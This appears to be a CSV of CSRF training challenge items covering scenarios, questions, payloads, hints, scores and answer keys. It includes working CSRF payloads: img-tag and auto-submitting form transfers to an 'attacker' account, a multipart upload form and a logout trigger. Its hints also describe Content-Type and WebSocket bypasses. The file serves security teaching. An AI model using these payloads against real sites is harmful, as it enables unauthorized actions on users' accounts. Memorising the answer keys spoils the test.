id,category,difficulty,scenario,question,payload,hint,score_weight,type,answer,expected_solutions,interactive_demo,hide_payload
csrf_1,CSRF Vulnerabilities,Beginner,A banking application without CSRF protection.,What attack can change user data without their knowledge?,Cross-Site Request Forgery,Think about requests that are made from other sites.,15,csrf,CSRF allows attackers to perform actions on behalf of authenticated users.,CSRF;Cross-Site Request Forgery;authenticated users;unauthorized actions,False,True
csrf_2,CSRF Vulnerabilities,Intermediate,A form that changes user settings.,How can you protect against CSRF attacks?,CSRF Tokens,Think about unique unpredictable values that verify request authenticity.,25,csrf,CSRF tokens are unique values that verify requests come from legitimate sources.,CSRF tokens;unique values;request authenticity;legitimate sources,False,True
csrf_3,CSRF Vulnerabilities,Advanced,An image tag that triggers a state change.,How can GET requests be exploited for CSRF?,"<img src=""http://bank.com/transfer?to=attacker&amount=1000"">",Browsers automatically load images which generates a GET request.,35,csrf,This payload uses an image tag to force the browser to make a GET request to a sensitive endpoint.,img;tag;GET request;automatic;load,False,True
csrf_4,CSRF Vulnerabilities,Intermediate,A form that uses POST but lacks CSRF protection.,How can you perform CSRF attacks on POST requests?,"<form action=""http://bank.com/transfer"" method=""POST""><input name=""to"" value=""attacker""/><input name=""amount"" value=""1000""/></form><script>document.forms[0].submit();</script>",Auto-submitting forms can trigger POST requests from malicious pages.,30,csrf,This payload creates an auto-submitting form that performs unauthorized POST requests.,POST;auto-submit;form;unauthorized;request,False,False
csrf_5,CSRF Vulnerabilities,Advanced,An API that accepts JSON but validates Content-Type.,How can you bypass Content-Type restrictions in CSRF?,Use form-encoded POST that gets parsed as JSON by backend,"Send a form with Content-Type: application/x-www-form-urlencoded, but structure the data like JSON. Many frameworks (Express.js, Flask) will parse both formats, letting you bypass the Content-Type check while still submitting valid JSON data.",40,csrf,CSRF can bypass Content-Type restrictions if the backend accepts multiple formats or has lenient parsing.,Content-Type;JSON;bypass;parsing;format,False,True
csrf_6,CSRF Vulnerabilities,Advanced,A SPA (Single Page Application) using cookies for authentication.,How does SameSite cookie attribute prevent CSRF?,SameSite=Strict or SameSite=Lax,SameSite attribute restricts when cookies are sent with cross-site requests.,35,csrf,SameSite cookie attribute prevents CSRF by restricting cookie transmission on cross-site requests.,SameSite;cookie attribute;cross-site;Strict;Lax,False,True
csrf_7,CSRF Vulnerabilities,Expert,A WebSocket connection without origin validation.,How can you perform CSRF attacks via WebSockets?,Establish WebSocket connection from malicious site,WebSockets can bypass CSRF protections if origin headers aren't validated.,45,csrf,WebSocket CSRF occurs when servers accept connections without validating the Origin header.,WebSocket;origin;validation;header;connection,False,True
csrf_8,CSRF Vulnerabilities,Expert,A file upload endpoint without CSRF tokens.,How can you exploit file upload via CSRF?,"<form action=""http://site.com/upload"" method=""POST"" enctype=""multipart/form-data""><input type=""file"" name=""file""/></form>","Create an auto-submitting HTML form with enctype=""multipart/form-data"" and a file input that submits to the upload endpoint. Host it on your site to exploit authenticated users.",50,csrf,CSRF file upload attacks allow attackers to upload malicious files on behalf of authenticated users.,"file upload;multipart;form-data;malicious;token",False,False
csrf_9,CSRF Vulnerabilities,Expert,A logout endpoint accessible via GET request.,How can you perform logout CSRF?,"<img src=""http://site.com/logout"">",Logout endpoints accessible via GET can be triggered by loading images.,35,csrf,Logout CSRF forces users to logout by triggering the logout endpoint via GET requests.,logout;GET;img tag;force;endpoint,False,False
csrf_10,CSRF Vulnerabilities,Expert,A modern application using custom headers for CSRF protection.,How effective are custom headers for CSRF prevention?,Custom headers like X-Requested-With prevent CSRF as they can't be set cross-origin,Custom headers require preflight CORS requests making cross-origin attacks harder.,45,csrf,Custom headers provide CSRF protection because browsers prevent cross-origin custom headers without CORS.,custom header;X-Requested-With;CORS;preflight;cross-origin,False,True
